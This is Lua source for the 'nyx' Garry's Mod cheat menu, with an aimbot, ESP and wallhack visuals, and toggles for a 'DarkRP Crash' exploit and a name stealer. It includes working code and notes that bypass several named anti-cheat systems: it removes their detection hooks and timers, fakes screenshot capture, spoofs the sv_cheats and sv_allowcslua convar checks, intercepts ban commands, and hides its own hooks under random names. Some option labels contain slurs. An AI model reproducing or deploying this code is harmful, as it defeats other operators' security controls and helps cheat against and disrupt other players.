        tab1_options[ 4 ].off = function( ) AIM_Ignore_Traitors = false; end;
        tab1_options[ 4 ].seton = function( ) AIM_Ignore_Traitors = true; end;	 
		
		tab1_options[ 5 ] = { };
        tab1_options[ 5 ].name = "Ignore Admins";
        tab1_options[ 5 ].on = function( ) return AIM_Ignore_Admins; end;
        tab1_options[ 5 ].off = function( ) AIM_Ignore_Admins = false; end;
        tab1_options[ 5 ].seton = function( ) AIM_Ignore_Admins = true; end;	 
	   
		tab1_options[ 6 ] = { };
        tab1_options[ 6 ].name = "Ignore TKZ Build Mode";
        tab1_options[ 6 ].on = function( ) return AIM_Ignore_TKZBuildMode; end;
        tab1_options[ 6 ].off = function( ) AIM_Ignore_TKZBuildMode = false; end;
        tab1_options[ 6 ].seton = function( ) AIM_Ignore_TKZBuildMode = true; end;	 
	   
	   	tab1_options[ 7 ] = { };
        tab1_options[ 7 ].name = "Aim Offset";
        tab1_options[ 7 ].scratch = function( )
                    local scratch = vgui.Create( "DNumberScratch", nyx_menu );
                    scratch:SetMin( -20 );
                    scratch:SetMax( 20 );
                    scratch:SetDecimals( 0 );
                    scratch:SetFloatValue( AIM_Offset );
                                        function scratch:OnValueChanged( val )
                                                AIM_Offset = val
                                        end;
                    return scratch;
            end;
		tab1_options[ 7 ].slider = true;
	   
		
		tab1_options[ 8 ] = { };
        tab1_options[ 8 ].name = "Auto Duck";
        tab1_options[ 8 ].on = function( ) return AIM_AutoDuck; end;
        tab1_options[ 8 ].off = function( ) AIM_AutoDuck = false; end;
        tab1_options[ 8 ].seton = function( ) AIM_AutoDuck = true; end;	 
		
		tab1_options[ 9 ] = { };
        tab1_options[ 9 ].name = "Auto Aim";
        tab1_options[ 9 ].on = function( ) return AIM_AutoAim; end;
        tab1_options[ 9 ].off = function( ) AIM_AutoAim = false; end;
        tab1_options[ 9 ].seton = function( ) AIM_AutoAim = true; end;	 
	   
		tab1_options[ 10 ] = { };
        tab1_options[ 10 ].name = "Rapid Fire";
        tab1_options[ 10 ].on = function( ) return AIM_RapidFire; end;
        tab1_options[ 10 ].off = function( ) AIM_RapidFire = false; end;
        tab1_options[ 10 ].seton = function( ) AIM_RapidFire = true; end;	 
		
        tab1_options[ 11 ] = { };
        tab1_options[ 11 ].name = "Ignore Color Teammates";
        tab1_options[ 11 ].on = function( ) return AIM_Ignore_Team_Color; end;
        tab1_options[ 11 ].off = function( ) AIM_Ignore_Team_Color = false; end;
        tab1_options[ 11 ].seton = function( ) AIM_Ignore_Team_Color = true; end;
		
        tab1_options[ 12 ] = { };
        tab1_options[ 12 ].name = "Murderer Aim Only";
        tab1_options[ 12 ].on = function( ) return AIM_Only_Murderer; end;
        tab1_options[ 12 ].off = function( ) AIM_Only_Murderer = false; end;
        tab1_options[ 12 ].seton = function( ) AIM_Only_Murderer = true; end;
		
        tab1_options[ 13 ] = { };
        tab1_options[ 13 ].name = "gSilent";
        tab1_options[ 13 ].on = function( ) return AIM_gSilent; end;
        tab1_options[ 13 ].off = function( ) AIM_gSilent = false; end;
        tab1_options[ 13 ].seton = function( ) AIM_gSilent = true; end;
		
		tab1_options[ 14 ] = { };
        tab1_options[ 14 ].name = "Ignore Teams Call of GMod";
        tab1_options[ 14 ].on = function( ) return AIM_COG_Ignore; end;
        tab1_options[ 14 ].off = function( ) AIM_COG_Ignore = false; end;
        tab1_options[ 14 ].seton = function( ) AIM_COG_Ignore = true; end;

		

-- tab 2
local tab2_options = { };
tab2_options.num = 2;
tab2_options.toggle = false;
 
        tab2_options.name = "Exploits"; -- edit name

		tab2_options[ 1 ] = { };
        tab2_options[ 1 ].name = "DarkRP Crash";
        tab2_options[ 1 ].on = function( ) return MISC_DarkRPCrash; end;
        tab2_options[ 1 ].off = function( ) MISC_DarkRPCrash = false; end;
        tab2_options[ 1 ].seton = function( ) MISC_DarkRPCrash = true; end;
 
		tab2_options[ 2 ] = { };
        tab2_options[ 2 ].name = "DarkRP Name Stealer";
        tab2_options[ 2 ].on = function( ) return MISC_DarkRPNameSteal; end;
        tab2_options[ 2 ].off = function( ) MISC_DarkRPNameSteal = false; end;
        tab2_options[ 2 ].seton = function( ) MISC_DarkRPNameSteal = true; end;
 		
		tab2_options[ 3 ] = { };
        tab2_options[ 3 ].name = "Spoil the Murderer in Chat (Needs Murder ESP)";
        tab2_options[ 3 ].on = function( ) return MISC_Murder_Spoil; end;
        tab2_options[ 3 ].off = function( ) MISC_Murder_Spoil = false; end;
        tab2_options[ 3 ].seton = function( ) MISC_Murder_Spoil = true; end;
		
		tab2_options[ 4 ] = { };
        tab2_options[ 4 ].name = "Spoil specfaggots in Chat";
        tab2_options[ 4 ].on = function( ) return MISC_Spectators_Spoil; end;
        tab2_options[ 4 ].off = function( ) MISC_Spectators_Spoil = false; end;
        tab2_options[ 4 ].seton = function( ) MISC_Spectators_Spoil = true; end;
	   
       
-- tab 3
local tab3_options = { };
tab3_options.num = 3;
tab3_options.toggle = false;
 
        tab3_options.name = "Visuals"; -- edit name
       

        tab3_options[ 1 ] = { };
        tab3_options[ 1 ].name = "Name ESP";
        tab3_options[ 1 ].on = function( ) return ESP_Name; end;
        tab3_options[ 1 ].off = function( ) ESP_Name = false; end;
        tab3_options[ 1 ].seton = function( ) ESP_Name = true; end;
		
		
        tab3_options[ 2 ] = { };
        tab3_options[ 2 ].name = "3D Boxes";
        tab3_options[ 2 ].on = function( ) return ESP_Box_3D; end;
        tab3_options[ 2 ].off = function( ) ESP_Box_3D = false; end;
        tab3_options[ 2 ].seton = function( ) ESP_Box_3D = true; end;
		
		
        tab3_options[ 3 ] = { };
        tab3_options[ 3 ].name = "Crosshair";
        tab3_options[ 3 ].on = function( ) return ESP_Crosshair; end;
        tab3_options[ 3 ].off = function( ) ESP_Crosshair = false; end;
        tab3_options[ 3 ].seton = function( ) ESP_Crosshair = true; end;
		
		
        tab3_options[ 4 ] = { };
        tab3_options[ 4 ].name = "Admin List";
        tab3_options[ 4 ].on = function( ) return ESP_AdminList; end;
        tab3_options[ 4 ].off = function( ) ESP_AdminList = false; end;
        tab3_options[ 4 ].seton = function( ) ESP_AdminList = true; end;
		
        tab3_options[ 5 ] = { };
        tab3_options[ 5 ].name = "Snap Lines";
        tab3_options[ 5 ].on = function( ) return ESP_SnapLines; end;
        tab3_options[ 5 ].off = function( ) ESP_SnapLines = false; end;
        tab3_options[ 5 ].seton = function( ) ESP_SnapLines = true; end;
		
        tab3_options[ 6 ] = { };
        tab3_options[ 6 ].name = "2D Boxes";
        tab3_options[ 6 ].on = function( ) return ESP_Box_2D; end;
        tab3_options[ 6 ].off = function( ) ESP_Box_2D = false; end;
        tab3_options[ 6 ].seton = function( ) ESP_Box_2D = true; end;

        tab3_options[ 7 ] = { };
        tab3_options[ 7 ].name = "Health ESP";
        tab3_options[ 7 ].on = function( ) return ESP_Health; end;
        tab3_options[ 7 ].off = function( ) ESP_Health = false; end;
        tab3_options[ 7 ].seton = function( ) ESP_Health = true; end;
		
        tab3_options[ 8 ] = { };
        tab3_options[ 8 ].name = "Weapon ESP";
        tab3_options[ 8 ].on = function( ) return ESP_Weapon; end;
        tab3_options[ 8 ].off = function( ) ESP_Weapon = false; end;
        tab3_options[ 8 ].seton = function( ) ESP_Weapon = true; end;
		
		tab3_options[ 9 ] = { };
        tab3_options[ 9 ].name = "Barrel ESP";
        tab3_options[ 9 ].on = function( ) return ESP_Barrel; end;
        tab3_options[ 9 ].off = function( ) ESP_Barrel = false; end;
        tab3_options[ 9 ].seton = function( ) ESP_Barrel = true; end;
		
		tab3_options[ 10 ] = { };
        tab3_options[ 10 ].name = "Radar";
        tab3_options[ 10 ].on = function( ) return ESP_Radar; end;
        tab3_options[ 10 ].off = function( ) ESP_Radar = false; end;
        tab3_options[ 10 ].seton = function( ) ESP_Radar = true; end;
		
		tab3_options[ 11 ] = { };
        tab3_options[ 11 ].name = "DarkRP Money ESP";
        tab3_options[ 11 ].on = function( ) return ESP_Money; end;
        tab3_options[ 11 ].off = function( ) ESP_Money = false; end;
        tab3_options[ 11 ].seton = function( ) ESP_Money = true; end;
						
		tab3_options[ 12 ] = { };
        tab3_options[ 12 ].name = "Use Radar as Crosshair";
        tab3_options[ 12 ].on = function( ) return ESP_Radar_Crosshair; end;
        tab3_options[ 12 ].off = function( ) ESP_Radar_Crosshair = false; end;
        tab3_options[ 12 ].seton = function( ) ESP_Radar_Crosshair = true; end;
		
		tab3_options[ 13 ] = { };
        tab3_options[ 13 ].name = "Murder ESP";
        tab3_options[ 13 ].on = function( ) return ESP_Murder; end;
        tab3_options[ 13 ].off = function( ) ESP_Murder = false; end;
        tab3_options[ 13 ].seton = function( ) ESP_Murder = true; end;
		
		tab3_options[ 14 ] = { };
        tab3_options[ 14 ].name = "Murder Loot ESP";
        tab3_options[ 14 ].on = function( ) return ESP_Murder_Loot; end;
        tab3_options[ 14 ].off = function( ) ESP_Murder_Loot = false; end;
        tab3_options[ 14 ].seton = function( ) ESP_Murder_Loot = true; end;
		
		tab3_options[ 15 ] = { };
        tab3_options[ 15 ].name = "Spectators List";
        tab3_options[ 15 ].on = function( ) return ESP_SpectatorsList; end;
        tab3_options[ 15 ].off = function( ) ESP_SpectatorsList = false; end;
        tab3_options[ 15 ].seton = function( ) ESP_SpectatorsList = true; end;
		
		tab3_options[ 15 ] = { };
        tab3_options[ 15 ].name = "Traitors ESP";
        tab3_options[ 15 ].on = function( ) return ESP_Traitors; end;
        tab3_options[ 15 ].off = function( ) ESP_Traitors = false; end;
        tab3_options[ 15 ].seton = function( ) ESP_Traitors = true; end;
		
		tab3_options[ 16 ] = { };
        tab3_options[ 16 ].name = "Snap Lines as Crosshair";
        tab3_options[ 16 ].on = function( ) return ESP_SnapLines_Crosshair; end;
        tab3_options[ 16 ].off = function( ) ESP_SnapLines_Crosshair = false; end;
        tab3_options[ 16 ].seton = function( ) ESP_SnapLines_Crosshair = true; end;
		
		tab3_options[ 17 ] = { };
        tab3_options[ 17 ].name = "Custom Color Scheme";
        tab3_options[ 17 ].on = function( ) return ESP_CustomColorScheme; end;
        tab3_options[ 17 ].off = function( ) ESP_CustomColorScheme = false; end;
        tab3_options[ 17 ].seton = function( ) ESP_CustomColorScheme = true; end;
		
		tab3_options[ 18 ] = { };
        tab3_options[ 18 ].name = "Ignore Teammates";
        tab3_options[ 18 ].on = function( ) return ESP_Ignore_Team; end;
        tab3_options[ 18 ].off = function( ) ESP_Ignore_Team = false; end;
        tab3_options[ 18 ].seton = function( ) ESP_Ignore_Team = true; end;
		
		tab3_options[ 19 ] = { };
        tab3_options[ 19 ].name = "Distance ESP";
        tab3_options[ 19 ].on = function( ) return ESP_Distance; end;
        tab3_options[ 19 ].off = function( ) ESP_Distance = false; end;
        tab3_options[ 19 ].seton = function( ) ESP_Distance = true; end;		
		
		
		
        local tab4_options = { };
        tab4_options.num = 4;
        tab4_options.toggle = false;
 
        tab4_options.name = "Misc"; -- edit name
       
        -- edit options
        tab4_options[ 1 ] = { };
		tab4_options[ 1 ].name = "Thirdperson";
		tab4_options[ 1 ].on = function( ) return var2; end;
		tab4_options[ 1 ].off = function( ) RunConsoleCommand( "firstperson" ); var2 = false; end;
		tab4_options[ 1 ].seton = function( ) RunConsoleCommand( "thirdperson" ); var2 = true; end;
       
		
		tab4_options[ 2 ] = { };
        tab4_options[ 2 ].name = "Bunnyhop";
        tab4_options[ 2 ].on = function( ) return MISC_BunnyHop; end;
        tab4_options[ 2 ].off = function( ) MISC_BunnyHop = false; end;
        tab4_options[ 2 ].seton = function( ) MISC_BunnyHop = true; end;

		tab4_options[ 3 ] = { };
        tab4_options[ 3 ].name = "Witness";
        tab4_options[ 3 ].on = function( ) return ESP_Witness; end;
        tab4_options[ 3 ].off = function( ) ESP_Witness = false; end;
        tab4_options[ 3 ].seton = function( ) ESP_Witness = true; end;
 
		tab4_options[ 4 ] = { };
        tab4_options[ 4 ].name = "Autistic Spammer (spammyass)";
        tab4_options[ 4 ].on = function( ) return MISC_AutistSpam; end;
        tab4_options[ 4 ].off = function( ) MISC_AutistSpam = false; end;
        tab4_options[ 4 ].seton = function( ) MISC_AutistSpam = true; end;
		
		tab4_options[ 5 ] = { };
        tab4_options[ 5 ].name = "Disable all Visuals (AntiLag ?)";
        tab4_options[ 5 ].on = function( ) return ESP_NoVisuals; end;
        tab4_options[ 5 ].off = function( ) ESP_NoVisuals = false; end;
        tab4_options[ 5 ].seton = function( ) ESP_NoVisuals = true; end;
		
		tab4_options[ 6 ] = { };
        tab4_options[ 6 ].name = "Back Camera";
        tab4_options[ 6 ].on = function( ) return ESP_BackCam; end;
        tab4_options[ 6 ].off = function( ) ESP_BackCam = false; end;
        tab4_options[ 6 ].seton = function( ) ESP_BackCam = true; end;
		
		tab4_options[ 7 ] = { };
        tab4_options[ 7 ].name = "Murderer Camera";
        tab4_options[ 7 ].on = function( ) return ESP_Murder_Cam; end;
        tab4_options[ 7 ].off = function( ) ESP_Murder_Cam = false; end;
        tab4_options[ 7 ].seton = function( ) ESP_Murder_Cam = true; end;
		
		
        local tab5_options = { };
        tab5_options.num = 5;
        tab5_options.toggle = false;
 
        tab5_options.name = "Entities"; -- edit name
		
		tab5_options[ 1 ] = { };
		tab5_options[ 1 ].name = "Class ESP";
		tab5_options[ 1 ].on = function( ) return ESP_Ents_Class; end;
		tab5_options[ 1 ].off = function( ) ESP_Ents_Class = false; end;
		tab5_options[ 1 ].seton = function( ) ESP_Ents_Class = true; end;
		
		tab5_options[ 2 ] = { };
		tab5_options[ 2 ].name = "Glow Halo ESP";
		tab5_options[ 2 ].on = function( ) return ESP_Ents_Glow; end;
		tab5_options[ 2 ].off = function( ) ESP_Ents_Glow = false; end;
		tab5_options[ 2 ].seton = function( ) ESP_Ents_Glow = true; end;

		tab5_options[ 3 ] = { };
		tab5_options[ 3 ].name = "Wallhack";
		tab5_options[ 3 ].on = function( ) return ESP_Ents_Wallhack; end;
		tab5_options[ 3 ].off = function( ) ESP_Ents_Wallhack = false; end;
		tab5_options[ 3 ].seton = function( ) ESP_Ents_Wallhack = true; end;

		/*
		tab5_options[ 1 ] = { };
        tab5_options[ 1 ].name = "TODO: Speedhack Speed";
        tab5_options[ 1 ].scratch = function( )
                    local scratch = vgui.Create( "DNumberScratch", nyx_menu );
                    scratch:SetMin( 2 );
                    scratch:SetMax( 10 );
                    scratch:SetDecimals( 0 );
                    scratch:SetFloatValue( GetConVarNumber( "nyx_speedhack_speed" ) );
                                        function scratch:OnValueChanged( val )
                                                RunConsoleCommand( "nyx_speedhack_speed", val )
                                        end;
                    return scratch;
            end;
       tab5_options[ 1 ].slider = true;
		
		function NYX:NewVar( VarName )
			if VarName then CreateClientConVar("NYX_"..VarName,0,true,false)
			else print('Invalid NYX:NewVar Detected !') end
		end
		
	   */
		
	   
	   
-- table
local tables = { tab1_options, tab2_options, tab3_options, tab4_options };
       
-- mouse think
local mouse_down = false;
local pressed = false;
local released = false;
local press_elem = nil;
 
hook.Add( "Think", "nyxGuiThink", function( )
    -- press
    if not pressed and input.IsMouseDown( MOUSE_LEFT ) then
        pressed = true;
                if IsValid( opt_menu ) then menuopen = true; end;
    end;
   
    -- release
    if pressed and not input.IsMouseDown( MOUSE_LEFT ) then
        pressed = false;
        released = true;
    end;
   
    if released then
        if press_elem then
                        if press_elem.toggle != nil then
                                press_elem.toggle = !press_elem.toggle;
                               
                                if press_elem.toggle then
                                        for k, v in pairs( press_elem ) do
                                                if type( v ) == "table" and v.slider then
                                                        v.scratcher = v.scratch( );
                                                        v.scratcher:SetPos( tab_x + ( tabwidth - 2 ) * press_elem.num - 1 - 16 - 5, 37 + k * 37 - 27 );
                                                end;
                                        end;
                                end;
                        elseif press_elem.options then
                                if not IsValid( opt_menu ) and menuopen then
                                        menuopen = false;
                                else
                                        press_elem.menu( );
                                end;
                        else
                                if press_elem.on( ) then
                                        press_elem.off( );
                                else
                                        press_elem.seton( );
                                end;
                        end;
                       
                        press_elem = nil;
        end;
       
        released = false;
    end;
end );
 
-- draw tab function
local function drawtab( x, first, vartab, tw )
        -- first seperator
        if first then
                surface.SetMaterial( seperator_side );
                surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
                surface.DrawTexturedRect( x, 0, 2, 36 );
        end;
   
        -- check for hover, with options for hovering with it being on or off
    local opt_on = vartab.toggle;
    local col = Color( 11, 156, 28, 255 );
    local col2 = Color( 51, 51, 51, 255 );
    if not opt_on then col = Color( 0, 123, 184, 255 ); col2 = Color( 61, 61, 61, 255 ); end;
   
    if util.InBox( x + 2, 0, tw - 4, 35 ) then
        if not opt_on then
            col2 = Color( 71, 71, 71, 255 );
            if pressed then col2 = Color( 81, 81, 81, 255 ); press_elem = vartab; end;
        else
            col2 = Color( 61, 61, 61, 255 );
            if pressed then col2 = Color( 71, 71, 71, 255 ); press_elem = vartab; end;
        end;
    end;
       
        -- box
    draw.RoundedBoxEx( 0, x + 2, 0, tw - 4, 35, col2 );
   
        -- sperator
    surface.SetMaterial( seperator_side );
    surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
    surface.DrawTexturedRect( x + tw - 2, 0, 2, 36 );
   
        -- name
    draw.SimpleText( vartab.name, "Derp", x + tw / 2, 35 / 2, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER );
   
    -- items
        if vartab.toggle then
                surface.SetMaterial( seperator_side );
                surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
                surface.DrawTexturedRect( x, 37, 2, 37 * #vartab );
               
                surface.SetMaterial( seperator_side );
                surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
                surface.DrawTexturedRect( x + tw - 2, 37, 2, 37 * #vartab );
               
                local yadd = 37;
               
                for i = 1, #vartab do
                        -- toggle stuff
                        local mat;
                        local opt_on;
                       
                        if not vartab[ i ].slider and not vartab[ i ].options then
                                opt_on = vartab[ i ].on( );
                                mat = on;
                        end;
                       
                        local col = Color( 11, 156, 28, 255 );
                        local col2 = Color( 51, 51, 51, 255 );
                       
                        if not vartab[ i ].slider and not vartab[ i ].options then
                                if not opt_on then
                                        mat = off;
                                        col = Color( 0, 123, 184, 255 );
                                end;
                        end;
                       
                        if util.InBox( x + 2, yadd, tw - 4, 35 ) and not vartab[ i ].slider then
                                if pressed then col2 = Color( 61, 61, 61, 255 ); press_elem = vartab[ i ]; end;
                        end;
                       
                        -- box
                        draw.RoundedBoxEx( 0, x + 2, yadd, tw - 4, 35, col2 );
                       
                        surface.SetMaterial( seperator_bottom );
                        surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
                        surface.DrawTexturedRect( x + 1, yadd + 35, tw - 3, 2 );
                       
                        -- on off material
                        if not vartab[ i ].slider and not vartab[ i ].options then
                                surface.SetMaterial( mat );
                                surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
                                surface.DrawTexturedRect( x + tw - 4 - 5 - 14, yadd + 36 / 2 - 7, 14, 14 );
                        end;
                       
                        -- text
                        if vartab[ i ].options then
                                draw.SimpleText( vartab[ i ].name .. " (PICK)", "HerpSmall", x + 10, yadd + 37 / 2, Color( 255, 120, 120, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER );
                                draw.SimpleText( vartab[ i ].name, "HerpSmall", x + 10, yadd + 37 / 2, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER );
                        else
                                draw.SimpleText( vartab[ i ].name, "HerpSmall", x + 10, yadd + 37 / 2, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER );
                        end;
                       
                        -- add y
                        yadd = yadd + 37;
                end;
               
                -- arrow
                surface.SetMaterial( arrow_down );
                surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
                surface.DrawTexturedRect( x + ( tw - 4 ) / 2 - 4, 37, 9, 6 );
        else
                -- arrow
                surface.SetMaterial( arrow_up );
                surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
                surface.DrawTexturedRect( x + ( tw - 4 ) / 2 - 4, 29, 9, 6 );
        end;
end;
 
-- nyx_paint function
nyx_paint = function( )
        -- bar
        surface.SetMaterial( grad );
        surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
        surface.DrawTexturedRect( 0, 0, ScrW( ), 35 );
       
        surface.SetMaterial( seperator_bottom );
        surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
        surface.DrawTexturedRect( 0, 35, ScrW( ), 2 );
       
        -- logo
        surface.SetMaterial( nyx );
        surface.SetDrawColor( Color( 255, 255, 255, 255 ) );
        surface.DrawTexturedRect( 8, -1, 91, 36 );
       
        -- tabs
        local after_logo_add = 25;
        tabwidth = math.ceil( ( ScrW( ) - 91 - ScrW( ) * 0.20 - after_logo_add ) / NUMBER_OF_TABS );
        tab_x = 91 + after_logo_add;
       
        -- add tabs here
        drawtab( tab_x, true, tab1_options, tabwidth );
        drawtab( tab_x + tabwidth - 2, false, tab2_options, tabwidth );
        drawtab( tab_x + ( tabwidth - 2 ) * 2, false, tab3_options, tabwidth );
        drawtab( tab_x + ( tabwidth - 2 ) * 3, false, tab4_options, tabwidth );
		drawtab( tab_x + ( tabwidth - 2 ) * 4, false, tab5_options, tabwidth );
end;
 
-- showgui
hook.Add( "Think", "Show_nyx", function( )
                        for k, v in pairs( tables ) do
                                for k2, v2 in pairs( v ) do
                                        if type( v2 ) == "table" and IsValid( v2.scratcher ) then
                                                if not v.toggle then
                                                        v2.scratcher:SetVisible( false );
                                                else
                                                        v2.scratcher:SetVisible( true );
                                                end;
                                        end;
                                end;
                        end;
               
                                if showgui then
                                        if not nyx_menu then
                                                        nyx_menu = vgui.Create( "DFrame" );
                                                        nyx_menu:ShowCloseButton( false );
                                                        nyx_menu:SetDraggable( false );
                                                        nyx_menu.lblTitle:SetVisible( false );
                                        else
                                                        if not nyx_menu.setpaint then
                                                                        nyx_menu.Paint = nyx_paint;
                                                                        nyx_menu.setpaint = true;
                                                        end;
                                               
                                                        nyx_menu:SetSize( ScrW( ), ScrH( ) );
                                        end;
                                else
                                        if nyx_menu then
                                                nyx_menu:Remove( );
                                                nyx_menu = nil;
                                        end;
                                end;
               
        if input.IsKeyDown( KEY_INSERT ) then
                homedown = true;
        elseif not input.IsKeyDown( KEY_INSERT ) and homedown then
                showgui = !showgui;
                gui.EnableScreenClicker( showgui );
                homedown = false;
        end;
end );

/*
===============================================================
	- Daz AC bypass:
		Daz's AC has a hook of math.random( 100, 100000 )
		So you remove all hooks named 100 - 100000
		
	- Stronghold's bypass:
		It has a shitty hook which people would ignore
		because of the name
		Remove it, no problems.
		
	- GModZ AC bypass:
		Same shit as stronghold's, but with timers
		
	- GageRP AC bypass:
		Same shit as GModZ...
		
	- Screenshots bypass:
		This will fuck up render.Capture by returning nothing.
		
	- ConVars bypass:
		Will return 0 for sv_allowcslua and sv_cheats
		
	- Cherry's AC bypass ( Possibly out-dated ):
		Cherry's AC detects blacklisted hooks, sh_menu is one
		Add sh_menu, trigger the AC, then remove it before
		it bans you.
		The AC will ignore you after this.	
=============================================================
*/


-- Daz anti-cheat (Old versions)
chatNotify(Color(255,255,255), "bypassing Daz's anti-cheat, expect lag!")
for i = 100, 100000 do
	hook.Remove( "Think", tostring( i ) )
end

chatNotify(Color(255,255,255), "bypassing F2S:Stronghold's shitty anti-cheat")
hook.Remove( "Think", "PlayerInfoThing" ) -- so bad

-- GageRP - Super Bad
chatNotify(Color(255,255,255), "bypassing GageRP's C+P anti-cheat" )
timer.Destroy("Check_AllowCSLua")
timer.Destroy("Check_AllowCSLua1")

-- Anti Screenshots
chatNotify(Color(255,255,255), "bypassing render.Capture" )
_G.render.Capture = function( data )
	ESP_Panic = true
	
		render.Clear( 0, 0, 0, 255, true, true )
		render.RenderView( {
			origin = EyePos(),
			angles = EyeAngles(),
			x = 0,
			y = 0,
			w = ScrW(),
			h = ScrH(),
			dopostprocess = true,
			drawhud = true,
			drawmonitors = true,
			drawviewmodel = true
		} )

		local worldpanel = _G.vgui.GetWorldPanel()
			if IsValid( worldpanel ) then
				worldpanel:PaintManual()
		end

	ESP_Panic = false
	return "fucku";
end

/*
[09:32:39] TheOneWithTheBeans .:    
net.Start("ATM_DepositMoney_C2S")
	net.WriteTable({Memo = DTextEntry_MEMO:GetValue(),Num=self.DepositBG.VerifiedData.Num,Amount=math.Round(Wang:GetValue())})
net.SendToServer()
*/
	/*
	--if (ESP_Glow == true) then halo["Add"]( {v}, col, 2, 2, 1, true, true ) end
		if (ESP_Chams == true) then
			cam.Start3D(EyePos(), EyeAngles())
				render.SuppressEngineLighting( true )
				render.MaterialOverride( ChamsMat )
				render.SetColorModulation(col.r / 255, col.g / 255, col.b / 255)
				v:DrawModel()
				if (IsValid(v:GetActiveWeapon())) then
					v:GetActiveWeapon():DrawModel()
				end
				render.SuppressEngineLighting( false )
				render.MaterialOverride( )
			cam.End3D()
		end
		--if (string.find( GAMEMODE.Name , "Trouble in" ) && bIsTraitor(v)) then
		--	draw['SimpleTextOutlined']( v:Nick(), "fonty", down.x, y1 - 16, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) ); 
		--end
	*/
	/*		
			local x = ScrW() / 2
			local y = ScrH() / 2
			surface.SetDrawColor( team['GetColor'](LocalPlayer():Team()) )
			local gap = 5
			local length = gap + 15
			surface.DrawLine( x - length, y, x - gap, y )
			surface.DrawLine( x + length, y, x + gap, y )
			surface.DrawLine( x, y - length, x, y - gap )
			surface.DrawLine( x, y + length, x, y + gap )
			
			surface.SetDrawColor( Color( 240, 240, 240 ) )
			surface.DrawLine( ScrW()/2-10, ScrH()/2, ScrW()/2-4, ScrH()/2 )
			surface.DrawLine( ScrW()/2+10, ScrH()/2, ScrW()/2+4, ScrH()/2 )
			surface.DrawLine( ScrW()/2, ScrH()/2-10, ScrW()/2, ScrH()/2-4 )
			surface.DrawLine( ScrW()/2, ScrH()/2+10, ScrW()/2, ScrH()/2+4 )
*/
/*
local in_render = false

hook.Add( "RenderScene", "Safe", function()
	
	in_render = true
	
	end )
     
    _G.detour.Func( _G.render, "Clear", function( old, ... )
     
            in_render = false
     
            return old( ... )
     
    end )
     
    _G.detour.Func( _G.render, "Capture", function( old, options )
     
            if not ESP_Panic and in_render then
                    ESP_Panic = true
                    render.Clear( 0, 0, 0, 255, true, true )
                    render.RenderView( {
                            origin = EyePos(),
                            angles = EyeAngles(),
                            x = 0,
                            y = 0,
                            w = ScrW(),
                            h = ScrH(),
                            dopostprocess = true,
                            drawhud = true,
                            drawmonitors = true,
                            drawviewmodel = true
                    } )
     
                    local worldpanel = _G.vgui.GetWorldPanel()
                    if IsValid( worldpanel ) then
                            worldpanel:PaintManual()
                    end
     
                    ESP_Panic = false
            end
     
            local out = old( options )
            return 0;
     
    end )
	*/

-- GmodZ anti-cheat
chatNotify(Color(255,255,255), "bypassing GModZ's anti-cheat" )
timer.Destroy( "AntiCheatTimer" ) -- New?
timer.Destroy( "testing123" ) -- Old?

-- Cherry's AC (Sammy's servers)
chatNotify(Color(255,255,255), "bypassing Cherry's shitty anti-cheat" )
hook.Add( "Think", "sh_menu", function()
	return true
end )
hook.Remove( "Think", "sh_menu" )

-- ConVars Bypass
chatNotify(Color(255,255,255), "bypassing GetConVarNumber" )
local OriginalGetConVarNumber = GetConVarNumber;
function GetConVarNumber( name )
        if ( name == "sv_allowcslua" or name == "sv_cheats" or name == "host_framerate") then
                return 0;
        else
                return OriginalGetConVarNumber( name );
        end
end

chatNotify(Color(255,255,255), "bypassing GetConVar" )
local OriginalGetConvar = GetConVar;
function GetConVar( name )
        if ( name == "sv_allowcslua" or name == "sv_cheats" or name == "host_framerate" or name == "host_timescale" ) then
                return;
        else
                return OriginalGetConvar( name );
        end
end


chatNotify(Color(255,255,255), "bypassing SAC" )
concommand.Add("_Sharkeys", function()
	chatNotify(Color(255,50,0), "SAC attempted to ban you." )
end)
concommand.Add("__mod", function()
	chatNotify(Color(255,50,0), "SAC attempted to ban you." )
end)






if SERVER then return end

local zz = {}

local concommand = concommand
local cvars = cvars
local debug = debug
local ents = ents
local file = file
local hook = hook
local math = math
local spawnmenu = spawnmenu
local string = string
local surface = surface
local table = table
local timer = timer
local util = util
local vgui = vgui

local Angle = Angle
local CreateClientConVar = CreateClientConVar
local CurTime = CurTime
local ErrorNoHalt = ErrorNoHalt
local FrameTime = FrameTime
local GetConVarString = GetConVarString
local GetViewEntity = GetViewEntity
local include = include
local ipairs = ipairs
local LocalPlayer = LocalPlayer
local pairs = pairs
local pcall = pcall
local print = print
local RunConsoleCommand = RunConsoleCommand
local ScrH = ScrH
local ScrW = ScrW
local tonumber = tonumber
local type = type
local unpack = unpack
local ValidEntity = IsValid
local Vector = Vector

do
    local hooks = {}
    local created = {}
    local function CallHook(self, name, args)
        if !hooks[name] then return end
        for funcName, _ in pairs(hooks[name]) do
            local func = self[funcName]
            if func then
                local ok, err = pcall(func, self, unpack(args or {}))
                if !ok then
                    ErrorNoHalt(err .. "\n")
                elseif err then
                    return err
                end
            end
        end
    end
    local function RandomName()
        local random = ""
        for i = 1, math.random(4, 10) do
            local c = math.random(65, 116)
            if c >= 91 && c <= 96 then c = c + 6 end
            random = random .. string.char(c)
        end
        return random
    end
    local function AddHook(self, name, funcName)
        -- If we haven't got a hook for this yet, make one with a random name and store it.
        -- This is so anti-cheats can't detect by hook name, and so we can remove them later.
        if !created[name] then
            local random = RandomName()
            hook.Add(name, random, function(...) return CallHook(self, name, {...}) end)
            created[name] = random
        end
        
        hooks[name] = hooks[name] or {}
        hooks[name][funcName] = true
    end
    
    local cvarhooks = {}
    local function GetCallbackTable(convar)
        local callbacks = cvars.GetConVarCallbacks(convar)
        if !callbacks then
            cvars.AddChangeCallback(convar, function() end)
            callbacks = cvars.GetConVarCallbacks(convar)
        end
        return callbacks
    end
            
